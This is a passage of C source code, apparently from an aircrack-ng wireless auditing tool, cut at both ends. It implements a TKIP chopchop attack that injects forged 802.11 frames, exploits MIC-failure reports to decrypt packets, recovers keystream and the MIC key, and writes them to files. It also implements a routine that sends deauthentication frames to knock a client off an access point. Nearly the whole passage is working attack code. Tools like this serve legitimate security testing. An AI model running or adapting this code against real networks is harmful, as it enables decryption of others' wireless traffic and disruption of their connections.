				psip[0] = srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32];
				psip[1] = srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33];
				psip[2] = i;
				psip[3] = j;

				if (check_guess(srcbuf,
								chopped,
								caplen,
								clearlen,
								arp,
								dmac)) // got correct guess
					return (0);
			}
		}
	}

	return (1);
}

static int do_attack_tkipchop(unsigned char * src_packet, int src_packet_len)
{
	REQUIRE(src_packet != NULL);

	float f, ticks[4];
	int i, j, n, z, caplen, srclen;
	int data_start, data_end;
	int guess, is_deauth_mode;
	int nb_bad_pkt;
	int tried_header_rec = 0;
	int tries = 0;
	int keystream_len = 0;
	int settle = 0;

	unsigned char b1 = 0xAA;
	unsigned char b2 = 0xAA;

	unsigned char mic[8];
	unsigned char smac[6], dmac[6], bssid[6];
	unsigned char rc4key[16], keystream[4096];

	FILE * f_cap_out;
	long nb_pkt_read;
	unsigned long crc_mask;
	unsigned char * chopped;

	unsigned char packet[4096];

	time_t tt;
	struct tm * lt;
	struct timeval tv;
	struct timeval tv2;
	struct timeval mic_fail;
	struct pcap_file_header pfh_out;
	struct pcap_pkthdr pkh;

	rand_init();

	memcpy(h80211, src_packet, src_packet_len);
	caplen = src_packet_len;
	if ((h80211[1] & 3) == 1)
	{
		h80211[1] += 1;

		memcpy(bssid, srcbuf + 4, 6);
		memcpy(dmac, srcbuf + 16, 6);
		memcpy(smac, srcbuf + 10, 6);

		memcpy(srcbuf + 10, bssid, 6);
		memcpy(srcbuf + 4, dmac, 6);
		memcpy(srcbuf + 16, smac, 6);
	}

	z = ((h80211[1] & 3) != 3) ? 24 : 30;
	if ((h80211[0] & 0x80) == 0x80) /* QoS */
		z += 2;

	if ((unsigned) caplen > sizeof(srcbuf)
		|| (unsigned) caplen > sizeof(h80211))
		return (1);

	/* Special handling for spanning-tree packets */
	if (memcmp(h80211 + 4, SPANTREE, 6) == 0
		|| memcmp(h80211 + 16, SPANTREE, 6) == 0)
	{
		b1 = 0x42;
		b2 = 0x42;
	}

	printf("\n");

	/* chopchop operation mode: truncate and decrypt the packet */
	/* we assume the plaintext starts with  AA AA 03 00 00 00   */
	/* (42 42 03 00 00 00 for spanning-tree packets)            */

	memcpy(srcbuf, h80211, caplen);

	/* debug: generate the keystream */
	if (lopt.got_ptk)
	{
		calc_tkip_ppk(srcbuf, caplen, lopt.wpa_sta.ptk + 32, rc4key);
		PCT;
		printf("Per Packet Key: ");
		for (i = 0; i < 15; i++) printf("%02X:", rc4key[i]);
		printf("%02X\n", rc4key[15]);

		memset(keystream, 0, 4096);

		keystream_len = caplen - z - 8;
		encrypt_wep(keystream, keystream_len, rc4key, 16);

		PCT;
		printf("Keystream length: %i, Keystream:\n", keystream_len);
		for (i = 0; i < keystream_len - 1; i++) printf("%02X:", keystream[i]);
		printf("%02X\n", keystream[keystream_len - 1]);

		memcpy(packet, srcbuf, caplen);
		PCT;
		printf("Decrypt: %i\n",
			   decrypt_wep(packet + z + 8, caplen - z - 8, rc4key, 16));
		PCT;
		printf("Keystream 2:\n");
		for (i = 0; i < keystream_len - 1; i++)
			printf("%02X:", packet[z + 8 + i] ^ srcbuf[z + 8 + i]);
		printf("%02X\n",
			   packet[z + 8 + keystream_len - 1]
				   ^ srcbuf[z + 8 + keystream_len - 1]);

		lopt.oldkeystreamlen = keystream_len - 37;
		for (i = 0; i < lopt.oldkeystreamlen; i++)
			lopt.oldkeystream[i] = keystream[keystream_len - 1 - i];
	}

	/* setup the chopping buffer */

	n = caplen;

	switch (srcbuf[1] & 3)
	{
		case 0:
			memcpy(bssid, srcbuf + 16, 6);
			memcpy(dmac, srcbuf + 4, 6);
			memcpy(smac, srcbuf + 10, 6);
			break;
		case 1:
			memcpy(bssid, srcbuf + 4, 6);
			memcpy(dmac, srcbuf + 16, 6);
			memcpy(smac, srcbuf + 10, 6);
			break;
		case 2:
			memcpy(bssid, srcbuf + 10, 6);
			memcpy(dmac, srcbuf + 4, 6);
			memcpy(smac, srcbuf + 16, 6);
			break;
		default:
			memcpy(bssid, srcbuf + 10, 6);
			memcpy(dmac, srcbuf + 16, 6);
			memcpy(smac, srcbuf + 24, 6);
			break;
	}

	if ((chopped = (unsigned char *) malloc(n)) == NULL)
	{
		perror("malloc failed");
		return (1);
	}

	memset(chopped, 0, n);

	memcpy(chopped, h80211, n);

	data_start = 26 + 8;
	srclen = data_end = n;

	chopped[24] ^= 0x01;
	chopped[25] = 0x00;

	/* setup the xor mask to hide the original data */

	crc_mask = 0;

	for (i = data_start; i < data_end - 4; i++)
	{
		switch (i - data_start)
		{
			case 0:
				chopped[i] = b1 ^ 0xE0;
				break;
			case 1:
				chopped[i] = b2 ^ 0xE0;
				break;
			case 2:
				chopped[i] = 0x03 ^ 0x03;
				break;
			default:
				chopped[i] = 0x55 ^ (i & 0xFF);
				break;
		}

		crc_mask = crc_tbl[crc_mask & 0xFF] ^ (crc_mask >> 8UL)
				   ^ ((unsigned long) chopped[i] << 24UL);
	}

	for (i = 0; i < 4; i++)
		crc_mask = crc_tbl[crc_mask & 0xFF] ^ (crc_mask >> 8UL);

	chopped[data_end - 4] = crc_mask;
	crc_mask >>= 8;
	chopped[data_end - 3] = crc_mask;
	crc_mask >>= 8;
	chopped[data_end - 2] = crc_mask;
	crc_mask >>= 8;
	chopped[data_end - 1] = crc_mask;
	crc_mask >>= 8;

	for (i = data_start; i < data_end; i++) chopped[i] ^= srcbuf[i];

	data_start += 6; /* skip the SNAP header */

	is_deauth_mode = 0;

	/* chop down old/known keystreambytes */
	for (i = 0; i < lopt.oldkeystreamlen; i++)
	{
		guess = (lopt.oldkeystream[i] ^ chopped[data_end - 1]) % 256;

		n = caplen - data_start;

		chopped[data_end - 1] ^= guess;
		chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
		chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
		chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
		chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

		printf("\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X\n",
			   data_end - 1,
			   100 * (caplen - data_end) / n,
			   chopped[data_end - 1],
			   chopped[data_end - 1] ^ srcbuf[data_end - 1]);

		data_end--;
	}

	/* let's go chopping */

	memset(ticks, 0, sizeof(ticks));

	nb_pkt_read = 0;
	nb_pkt_sent = 0;
	nb_bad_pkt = 0;
	guess = 256;

	tt = time(NULL);

	if (opt.port_in <= 0)
	{
		if (fcntl(dev.fd_in, F_SETFL, O_NONBLOCK) < 0)
		{
			perror("fcntl(O_NONBLOCK) failed");
			free(chopped);
			return (1);
		}
	}

	while (data_end > data_start)
	{
		if (alarmed)
		{
			printf("\n\n"
				   "The chopchop attack appears to have failed. Possible "
				   "reasons:\n"
				   "\n"
				   "    * You're trying to inject with an unsupported chipset "
				   "(Centrino?).\n"
				   "    * The driver source wasn't properly patched for "
				   "injection support.\n"
				   "    * You are too far from the AP. Get closer or reduce "
				   "the send rate.\n"
				   "    * Target is 802.11g only but you are using a Prism2 or "
				   "RTL8180.\n"
				   "    * The wireless interface isn't setup on the correct "
				   "channel.\n");
			if (is_deauth_mode) //-V547
				printf("    * The AP isn't vulnerable when operating in "
					   "non-authenticated mode.\n"
					   "      Run aireplay-ng in authenticated mode instead "
					   "(-h option).\n\n");
			else
				printf("    * The client MAC you have specified is not "
					   "currently authenticated.\n"
					   "      Try running another aireplay-ng to fake "
					   "authentication (attack \"-1\").\n"
					   "    * The AP isn't vulnerable when operating in "
					   "authenticated mode.\n"
					   "      Try aireplay-ng in non-authenticated mode "
					   "instead (no -h option).\n\n");
			free(chopped);
			return (1);
		}

		/* wait for the next timer interrupt, or sleep */

		if ((nb_pkt_sent > 0) && (nb_pkt_sent % 256 == 0) && settle == 0)
		{
			printf("\rLooks like mic failure report was not detected."
				   "Waiting %i seconds before trying again to avoid "
				   "the AP shutting down.\n",
				   lopt.mic_failure_interval);
			fflush(stdout);
			settle = 1;
			sleep(lopt.mic_failure_interval);
		}

		if (dev.fd_rtc >= 0)
		{
			if (read(dev.fd_rtc, &n, sizeof(n)) < 0)
			{
				perror("\nread(/dev/rtc) failed");
				free(chopped);
				return (1);
			}

			ticks[0]++; /* ticks since we entered the while loop     */
			ticks[1]++; /* ticks since the last status line update   */
			ticks[2]++; /* ticks since the last frame was sent       */
			ticks[3]++; /* ticks since started chopping current byte */
		}
		else
		{
			/* we can't trust usleep, since it depends on the HZ */

			gettimeofday(&tv, NULL);
			usleep(976);
			gettimeofday(&tv2, NULL);

			f = 1000000 * (float) (tv2.tv_sec - tv.tv_sec)
				+ (float) (tv2.tv_usec - tv.tv_usec);

			ticks[0] += f / 976;
			ticks[1] += f / 976;
			ticks[2] += f / 976;
			ticks[3] += f / 976;
		}

		/* update the status line */

		if (ticks[1] > ((float) RTC_RESOLUTION / 10.f))
		{
			ticks[1] = 0;
			printf("\rSent %3lu packets, current guess: %02X...",
				   nb_pkt_sent,
				   guess);
			fflush(stdout);
			erase_line(0);
		}

		if (data_end < 47 && tries > 512)
		{
		header_rec:

			printf("\n\nThe AP appears to drop packets shorter "
				   "than %d bytes.\n",
				   data_end);

			data_end = 46;

			z = ((h80211[1] & 3) != 3) ? 24 : 30;
			if ((h80211[0] & 0x80) == 0x80) /* QoS */
				z += 2;

			if ((chopped[data_end + 0] ^ srcbuf[data_end + 0]) == 0x06
				&& (chopped[data_end + 1] ^ srcbuf[data_end + 1]) == 0x04
				&& (chopped[data_end + 2] ^ srcbuf[data_end + 2]) == 0x00)
			{
				printf("Enabling standard workaround: "
					   "ARP header re-creation.\n");

				chopped[26 + 8 + 6] = srcbuf[26 + 8 + 6] ^ 0x08; //-V525
				chopped[26 + 8 + 7] = srcbuf[26 + 8 + 7] ^ 0x06;
				chopped[26 + 8 + 8] = srcbuf[26 + 8 + 8] ^ 0x00;
				chopped[26 + 8 + 9] = srcbuf[26 + 8 + 9] ^ 0x01;
				chopped[26 + 8 + 10] = srcbuf[26 + 8 + 10] ^ 0x08;
				chopped[26 + 8 + 11] = srcbuf[26 + 8 + 11] ^ 0x00;
			}
			else
			{
				printf("Enabling standard workaround: "
					   " IP header re-creation.\n");

				n = caplen - (z + 16);

				chopped[26 + 8 + 0] = srcbuf[26 + 8 + 0] ^ 0xAA;
				chopped[26 + 8 + 1] = srcbuf[26 + 8 + 1] ^ 0xAA;
				chopped[26 + 8 + 2] = srcbuf[26 + 8 + 2] ^ 0x03;
				chopped[26 + 8 + 3] = srcbuf[26 + 8 + 3] ^ 0x00;
				chopped[26 + 8 + 4] = srcbuf[26 + 8 + 4] ^ 0x00;
				chopped[26 + 8 + 5] = srcbuf[26 + 8 + 5] ^ 0x00;
				chopped[26 + 8 + 6] = srcbuf[26 + 8 + 6] ^ 0x08;
				chopped[26 + 8 + 7] = srcbuf[26 + 8 + 7] ^ 0x00;
				chopped[26 + 8 + 8] = srcbuf[26 + 8 + 8] ^ (n >> 8);
				chopped[26 + 8 + 9] = srcbuf[26 + 8 + 9] ^ (n & 0xFF);

				memcpy(h80211, srcbuf, caplen);

				for (i = 26 + 8; i < (int) caplen; i++)
					h80211[i - 8] = h80211[i] ^ chopped[i];

				/* sometimes the header length or the tos field vary */

				for (i = 0; i < 16; i++)
				{
					h80211[26 + 8] = 0x40 + i;
					chopped[26 + 8 + 8] = srcbuf[26 + 8 + 8] ^ (0x40 + i);

					for (j = 0; j < 256; j++)
					{
						h80211[26 + 9] = j;
						chopped[26 + 13] = srcbuf[26 + 8 + 9] ^ j;

						if (check_crc_buf(h80211 + 26, caplen - 26 - 8 - 4))
							goto have_crc_match;
					}
				}

				printf("This doesn't look like an IP packet, "
					   "try another one.\n");
			}

		have_crc_match:
			break;
		}

		if ((ticks[2] * opt.r_nbpps) / RTC_RESOLUTION >= 1)
		{
			/* send one modified frame */

			ticks[2] = 0;

			memcpy(h80211, chopped, data_end - 1);

			/* note: guess 256 is special, it tests if the  *
			 * AP properly drops frames with an invalid ICV *
			 * so this guess always has its bit 8 set to 0  */

			if (is_deauth_mode) //-V547
			{
				opt.r_smac[1] |= (guess < 256);
				opt.r_smac[5] = guess & 0xFF;
			}
			else
			{
				opt.r_dmac[1] |= (guess < 256);
				opt.r_dmac[5] = guess & 0xFF;
			}

			if (guess < 256)
			{
				h80211[data_end - 2] ^= crc_chop_tbl[guess][3];
				h80211[data_end - 3] ^= crc_chop_tbl[guess][2];
				h80211[data_end - 4] ^= crc_chop_tbl[guess][1];
				h80211[data_end - 5] ^= crc_chop_tbl[guess][0];
			}

			errno = 0;

			if (send_packet(_wi_out, h80211, (size_t) data_end - 1, kNoChange)
				!= 0)
			{
				free(chopped);
				return (1);
			}

			if (errno != EAGAIN)
			{
				guess++;

				if (guess > 256)
					guess = 0;
				else
					tries++;

				settle = 0;
			}

			if (tries > 768 && data_end < srclen)
			{
				// go back one step and validate the last chopped byte
				tries = 0;

				data_end++;

				guess = chopped[data_end - 1] ^ srcbuf[data_end - 1];

				chopped[data_end - 1] ^= guess;
				chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
				chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
				chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
				chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

				ticks[3] = 0;
				nb_pkt_sent = 0;
				nb_bad_pkt = 0;
				guess = 256;

				PCT;
				printf("\nMoved one step backwards to chop the last byte "
					   "again.\n");
				continue;
			}
		}

		/* watch for a response from the AP */

		n = read_packet(_wi_in, h80211, sizeof(h80211), NULL);

		if (n < 0)
		{
			free(chopped);
			return (1);
		}
		if (n == 0) continue;

		nb_pkt_read++;

		/* check if it's a deauth packet */

		if (h80211[0] == 0xA0 || h80211[0] == 0xC0)
		{
			if (memcmp(h80211 + 4, opt.r_smac, 6) == 0)
			{
				nb_bad_pkt++;

				if (nb_bad_pkt > 2)
				{
					printf(
						"\n\nFailure: got several deauthentication packets "
						"from the AP - you need to start the whole process "
						"all over again, as the client got disconnected.\n\n");
					free(chopped);
					return (1);
				}

				continue;
			}

			if (h80211[4] != opt.r_smac[0]) continue;
			if (h80211[6] != opt.r_smac[2]) continue;
			if (h80211[7] != opt.r_smac[3]) continue;
			if (h80211[8] != opt.r_smac[4]) continue;

			if (data_end < 41) goto header_rec; //-V547

			printf("\n\nFailure: the access point does not properly "
				   "discard frames with an\ninvalid ICV - try running "
				   "aireplay-ng in authenticated mode (-h) instead.\n\n");
			free(chopped);
			return (1);
		}
		else
		{
			/* check if it's a WEP data packet */

			if ((h80211[0] & 0x0C) != 8) continue; // must be a data packet
			if ((h80211[0] & 0x70) != 0) continue;
			//             if( ( h80211[1] & 0x03 ) != 2 ) continue;
			if ((h80211[1] & 0x40) == 0) continue;

			/* get header length right */
			z = ((h80211[1] & 3) != 3) ? 24 : 30;
			if ((h80211[0] & 0x80) == 0x80) /* QoS */
				z += 2;

			/* check the extended IV (TKIP) flag */
			if ((h80211[z + 3] & 0x20) == 0) continue;

			/* check length (153)!? */
			if (z + 127 != n)
				continue; //(153[26+127] bytes for eapol mic failure in tkip qos
			// frames from client to AP)

			// direction must be inverted.
			if (((h80211[1] & 3) ^ (srcbuf[1] & 3)) != 0x03) continue;

			// check correct macs
			switch (h80211[1] & 3)
			{
				case 1:
					if (memcmp(bssid, h80211 + 4, 6) != 0
						&& memcmp(dmac, h80211 + 10, 6) != 0
						&& memcmp(bssid, h80211 + 16, 6) != 0)
						continue;
					break;
				case 2:
					if (memcmp(smac, h80211 + 4, 6) != 0
						&& memcmp(bssid, h80211 + 10, 6) != 0
						&& memcmp(bssid, h80211 + 16, 6) != 0)
						continue;
					break;
				default:
					continue;
					break;
			}

			if (nb_pkt_sent < 1) continue;
		}

		/* we have a winner */

		tries = 0;
		settle = 0;
		guess = (guess - 1) % 256;

		chopped[data_end - 1] ^= guess;
		chopped[data_end - 2] ^= crc_chop_tbl[guess][3];
		chopped[data_end - 3] ^= crc_chop_tbl[guess][2];
		chopped[data_end - 4] ^= crc_chop_tbl[guess][1];
		chopped[data_end - 5] ^= crc_chop_tbl[guess][0];

		n = caplen - data_start;

		printf("\r");
		PCT;
		printf("Offset %4d (%2d%% done) | xor = %02X | pt = %02X | "
			   "%4lu frames written in %5.0fms\n",
			   data_end - 1,
			   100 * (caplen - data_end) / n,
			   chopped[data_end - 1],
			   chopped[data_end - 1] ^ srcbuf[data_end - 1],
			   nb_pkt_sent,
			   ticks[3]);

		if (is_deauth_mode) //-V547
		{
			opt.r_smac[1] = rand_u8() & 0x3E;
			opt.r_smac[2] = rand_u8();
			opt.r_smac[3] = rand_u8();
			opt.r_smac[4] = rand_u8();
		}
		else
		{
			opt.r_dmac[1] = rand_u8() & 0xFE;
			opt.r_dmac[2] = rand_u8();
			opt.r_dmac[3] = rand_u8();
			opt.r_dmac[4] = rand_u8();
		}

		ticks[3] = 0;
		nb_pkt_sent = 0;
		nb_bad_pkt = 0;
		guess = 256;

		data_end--;

		gettimeofday(&lopt.last_mic_failure, NULL);
		PCT;
		printf("\rSleeping for %i seconds.", lopt.mic_failure_interval);
		fflush(stdout);

		if (guess_packet(srcbuf, chopped, caplen, caplen - data_end)
			== 0) // found correct packet :)
			break;

		while (1)
		{
			gettimeofday(&mic_fail, NULL);
			if ((mic_fail.tv_sec - lopt.last_mic_failure.tv_sec) * 1000000
					+ (mic_fail.tv_usec - lopt.last_mic_failure.tv_usec)
				> lopt.mic_failure_interval * 1000000)
				break;
			sleep(1);
		}

		alarm(0);
	}

	/* reveal the plaintext (chopped contains the prga) */

	memcpy(h80211, srcbuf, caplen);

	z = ((h80211[1] & 3) != 3) ? 24 : 30;
	if ((h80211[0] & 0x80) == 0x80) /* QoS */
		z += 2;

	chopped[26 + 8 + 0] = srcbuf[26 + 8 + 0] ^ b1;
	chopped[26 + 8 + 1] = srcbuf[26 + 8 + 1] ^ b2;
	chopped[26 + 8 + 2] = srcbuf[26 + 8 + 2] ^ 0x03;
	chopped[26 + 8 + 3] = srcbuf[26 + 8 + 3] ^ 0x00;
	chopped[26 + 8 + 4] = srcbuf[26 + 8 + 4] ^ 0x00;
	chopped[26 + 8 + 5] = srcbuf[26 + 8 + 5] ^ 0x00;

	for (i = 26 + 8; i < (int) caplen; i++)
		h80211[i - 8] = h80211[i] ^ chopped[i];

	if (!check_crc_buf(h80211 + 26, caplen - 26 - 8 - 4))
	{
		if (!tried_header_rec)
		{
			printf("\nWarning: ICV checksum verification FAILED! Trying "
				   "workaround.\n");
			tried_header_rec = 1;
			goto header_rec;
		}
		else
		{
			printf("\nWorkaround couldn't fix ICV checksum.\nPacket is most "
				   "likely invalid/useless\nTry another one.\n");
		}
	}

	caplen -= 8 + 4; /* remove the TKIP EXT IV & CRC (ICV) */

	if (lopt.got_ptk)
	{
		PCT;
		printf("Priority: %02X:%02X\n", h80211[z - 2], h80211[z - 1]);
		calc_tkip_mic(h80211, caplen - 8, lopt.wpa_sta.ptk, mic);
		if (memcmp(mic, h80211 + caplen - 8, 8) == 0)
		{
			PCT;
			printf("Correct MIC!\n");
		}
		else
		{
			PCT;
			printf("Incorrect MIC!\n");
		}
		PCT;
		printf("Captured MIC: ");
		for (i = 0; i < 7; i++) printf("%02X:", h80211[caplen - 8 + i]);
		printf("%02X\n", h80211[caplen - 1]);
		PCT;
		printf("Calculated MIC: ");
		for (i = 0; i < 7; i++) printf("%02X:", mic[i]);
		printf("%02X\n", mic[7]);
	}

	calc_tkip_mic_key(h80211, caplen, mic);

	h80211[1] &= 0xBF; /* remove the WEP bit, too */

	if ((h80211[1] & 3) == 1)
	{
		PCT;
		printf("Reversed MIC Key (ToDS): ");
		for (i = 0; i < 7; i++) printf("%02X:", mic[i]);
		printf("%02X\n", mic[7]);
		memcpy(lopt.ptk + 48 + 8, mic, 8);
		lopt.got_mic_tods = 1;
		lopt.chopped_to_plain = (unsigned char *) malloc(caplen);
		ALLEGE(lopt.chopped_to_plain != NULL);
		memcpy(lopt.chopped_to_plain, h80211, caplen);
		lopt.chopped_to_plain_len = caplen;
		lopt.chopped_to_prga = (unsigned char *) malloc(caplen - 26 + 4 + 8);
		ALLEGE(lopt.chopped_to_prga != NULL);
		memcpy(lopt.chopped_to_prga, chopped + 26, caplen - 26 + 4 + 8);
		lopt.chopped_to_prga_len = caplen - 26 + 4 + 8;
	}

	if ((h80211[1] & 3) == 2)
	{
		PCT;
		printf("Reversed MIC Key (FromDS): ");
		for (i = 0; i < 7; i++) printf("%02X:", mic[i]);
		printf("%02X\n", mic[7]);
		memcpy(lopt.ptk + 48, mic, 8);
		lopt.got_mic_fromds = 1;
		lopt.chopped_from_plain = (unsigned char *) malloc(caplen);
		ALLEGE(lopt.chopped_from_plain != NULL);
		memcpy(lopt.chopped_from_plain, h80211, caplen);
		lopt.chopped_from_plain_len = caplen;
		lopt.chopped_from_prga = (unsigned char *) malloc(caplen - 26 + 4 + 8);
		ALLEGE(lopt.chopped_from_prga != NULL);
		memcpy(lopt.chopped_from_prga, chopped + 26, caplen - 26 + 4 + 8);
		lopt.chopped_from_prga_len = caplen - 26 + 4 + 8;
	}

	/* save the decrypted packet */

	gettimeofday(&tv, NULL);

	pfh_out.magic = TCPDUMP_MAGIC;
	pfh_out.version_major = PCAP_VERSION_MAJOR;
	pfh_out.version_minor = PCAP_VERSION_MINOR;
	pfh_out.thiszone = 0;
	pfh_out.sigfigs = 0;
	pfh_out.snaplen = 65535;
	pfh_out.linktype = LINKTYPE_IEEE802_11;

	pkh.tv_sec = tv.tv_sec;
	pkh.tv_usec = tv.tv_usec;
	pkh.caplen = caplen;
	pkh.len = caplen;

	lt = localtime((const time_t *) &tv.tv_sec);

	memset(strbuf, 0, sizeof(strbuf));
	snprintf(strbuf,
			 sizeof(strbuf) - 1,
			 "replay_dec-%02d%02d-%02d%02d%02d.cap",
			 lt->tm_mon + 1,
			 lt->tm_mday,
			 lt->tm_hour,
			 lt->tm_min,
			 lt->tm_sec);

	printf("\nSaving plaintext in %s\n", strbuf);

	if ((f_cap_out = fopen(strbuf, "wb+")) == NULL)
	{
		perror("fopen failed");
		free(chopped);
		return (1);
	}

	n = sizeof(struct pcap_file_header);

	if (fwrite(&pfh_out, n, 1, f_cap_out) != 1)
	{
		perror("fwrite failed\n");
		fclose(f_cap_out);
		free(chopped);
		return (1);
	}

	n = sizeof(pkh);

	if (fwrite(&pkh, n, 1, f_cap_out) != 1)
	{
		perror("fwrite failed");
		fclose(f_cap_out);
		free(chopped);
		return (1);
	}

	n = pkh.caplen;

	if (fwrite(h80211, n, 1, f_cap_out) != 1)
	{
		perror("fwrite failed");
		fclose(f_cap_out);
		free(chopped);
		return (1);
	}

	fclose(f_cap_out);

	/* save the RC4 stream (xor mask) */

	memset(strbuf, 0, sizeof(strbuf));
	snprintf(strbuf,
			 sizeof(strbuf) - 1,
			 "replay_dec-%02d%02d-%02d%02d%02d.xor",
			 lt->tm_mon + 1,
			 lt->tm_mday,
			 lt->tm_hour,
			 lt->tm_min,
			 lt->tm_sec);

	printf("Saving keystream in %s\n", strbuf);

	if ((f_cap_out = fopen(strbuf, "wb+")) == NULL)
	{
		perror("fopen failed");
		free(chopped);
		return (1);
	}

	n = pkh.caplen - 26;

	if (fwrite(chopped + 26 + 8, n, 1, f_cap_out) != 1)
	{
		perror("fwrite failed");
		free(chopped);
		return (1);
	}

	fclose(f_cap_out);

	PCT;
	printf("\nCompleted in %llds (%0.2f bytes/s)\n\n",
		   (long long) time(NULL) - tt,
		   (float) (pkh.caplen - 6 - 26) / (float) (time(NULL) - tt));

	free(chopped);

	return (0);
}

static int getHDSK(void)
{
	int i;
	int aacks, sacks, caplen;
	struct timeval tv;
	fd_set rfds;

	/* deauthenticate the target */

	memcpy(h80211, DEAUTH_REQ, 26);
	memcpy(h80211 + 16, opt.r_bssid, 6);

	aacks = 0;
	sacks = 0;
	for (i = 0; i < 4; i++)
	{
		if (i == 0)
		{
			PCT;
			printf("Sending 4 directed DeAuth. STMAC:"
				   " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
				   lopt.wpa.stmac[0],
				   lopt.wpa.stmac[1],
				   lopt.wpa.stmac[2],
				   lopt.wpa.stmac[3],
				   lopt.wpa.stmac[4],
				   lopt.wpa.stmac[5],
				   sacks,
				   aacks);
		}

		memcpy(h80211 + 4, lopt.wpa.stmac, 6);
		memcpy(h80211 + 10, opt.r_bssid, 6);

		if (send_packet(_wi_out, h80211, 26, kNoChange) < 0) return (1);

		usleep(2000);

		memcpy(h80211 + 4, opt.r_bssid, 6);
		memcpy(h80211 + 10, lopt.wpa.stmac, 6);

		if (send_packet(_wi_out, h80211, 26, kNoChange) < 0) return (1);

		usleep(100000);

		while (1)
		{
			FD_ZERO(&rfds);
			FD_SET(dev.fd_in, &rfds);

			tv.tv_sec = 0;
			tv.tv_usec = 1000;

			if (select(dev.fd_in + 1, &rfds, NULL, NULL, &tv) < 0)
			{
				if (errno == EINTR) continue;
				perror("select failed");
				return (1);
			}

			if (!FD_ISSET(dev.fd_in, &rfds)) break;

			caplen = read_packet(_wi_in, h80211, sizeof(h80211), NULL);

			check_received(h80211, caplen);

			if (caplen <= 0) break;
			if (caplen != 10) continue;
			if (h80211[0] == 0xD4)
			{
				if (memcmp(h80211 + 4, lopt.wpa.stmac, 6) == 0)
				{
					aacks++;
				}
				if (memcmp(h80211 + 4, opt.r_bssid, 6) == 0)
				{
					sacks++;
				}
				PCT;
				printf("Sending 4 directed DeAuth. STMAC:"
					   " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
					   lopt.wpa.stmac[0],
					   lopt.wpa.stmac[1],
					   lopt.wpa.stmac[2],
					   lopt.wpa.stmac[3],
					   lopt.wpa.stmac[4],
					   lopt.wpa.stmac[5],
					   sacks,
					   aacks);
			}
		}
	}
	printf("\n");

	return (0);
}

int main(int argc, char * argv[])
{
	int i, ret, got_hdsk;
	unsigned int n;
	char *s, buf[128];
	int caplen = 0;
	unsigned char packet1[4096];
	unsigned char packet2[4096];
	int packet1_len, packet2_len;
	struct timeval mic_fail;

	ac_crypto_init();

	/* check the arguments */

	memset(&opt, 0, sizeof(opt));
	memset(&dev, 0, sizeof(dev));

	opt.f_type = -1;
	opt.f_subtype = -1;
	opt.f_minlen = 80;
	opt.f_maxlen = 80;
	lopt.f_minlen_set = 0;
	lopt.f_maxlen_set = 0;
	opt.f_tods = -1;
	opt.f_fromds = -1;
	opt.f_iswep = -1;
	opt.ringbuffer = 8;

	opt.a_mode = -1;
	opt.r_fctrl = -1;
	opt.ghost = 0;
	opt.npackets = -1;
	opt.delay = 15;
	opt.bittest = 0;
	opt.fast = -1;
	opt.r_smac_set = 0;
	opt.nodetect = 0;
	lopt.mic_failure_interval = DEFAULT_MIC_FAILURE_INTERVAL;

	while (1)
	{
		int option_index = 0;

		static const struct option long_options[] = {{"help", 0, 0, 'H'},
													 {"pmk", 1, 0, 'P'},
													 {"psk", 1, 0, 'p'},
													 {0, 0, 0, 0}};

		int option = getopt_long(argc,
								 argv,
								 "d:s:m:n:t:f:x:a:c:h:e:jy:i:r:HZDK:P:p:M:",
								 long_options,
								 &option_index);

		if (option < 0) break;

		switch (option)
		{
			case 0:

				break;

			case ':':
			case '?':

				printf("\"%s --help\" for help.\n", argv[0]);
				return (1);

			case 'd':

				if (getmac(optarg, 1, opt.f_dmac) != 0)
				{
					printf("Invalid destination MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 's':

				if (getmac(optarg, 1, opt.f_smac) != 0)
				{
					printf("Invalid source MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 'm':

				ret = sscanf(optarg, "%d", &opt.f_minlen);
				if (opt.f_minlen < 0 || ret != 1)
				{
					printf("Invalid minimum length filter. [>=0]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				lopt.f_minlen_set = 1;
				break;

			case 'n':

				ret = sscanf(optarg, "%d", &opt.f_maxlen);
				if (opt.f_maxlen < 0 || ret != 1)
				{
					printf("Invalid maximum length filter. [>=0]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				lopt.f_maxlen_set = 1;
				break;

			case 't':

				ret = sscanf(optarg, "%d", &opt.f_tods);
				if ((opt.f_tods != 0 && opt.f_tods != 1) || ret != 1)
				{
					printf("Invalid tods filter. [0,1]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 'f':

				ret = sscanf(optarg, "%d", &opt.f_fromds);
				if ((opt.f_fromds != 0 && opt.f_fromds != 1) || ret != 1)
				{
					printf("Invalid fromds filter. [0,1]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 'x':

				ret = sscanf(optarg, "%d", &opt.r_nbpps);
				if (opt.r_nbpps < 1 || opt.r_nbpps > 1024 || ret != 1)
				{
					printf("Invalid number of packets per second. [1-1024]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 'a':

				if (getmac(optarg, 1, opt.r_bssid) != 0)
				{
					printf("Invalid AP MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				if (getmac(optarg, 1, opt.f_bssid) != 0)
				{
					printf("Invalid AP MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 'c':

				if (getmac(optarg, 1, opt.r_dmac) != 0)
				{
					printf("Invalid destination MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (1);
				}
				break;

			case 'h':

				if (getmac(optarg, 1, opt.r_smac) != 0)
				{
					printf("Invalid source MAC address.\n");
